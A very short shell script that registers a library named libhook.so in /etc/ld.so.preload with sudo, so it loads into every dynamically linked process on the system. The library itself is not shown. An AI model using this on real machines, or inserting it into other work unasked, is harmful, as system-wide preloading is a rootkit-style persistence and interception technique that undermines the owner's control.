osName=libhook.so

echo $PWD/$osName > ld.so.preload
sudo cp ld.so.preload /etc/
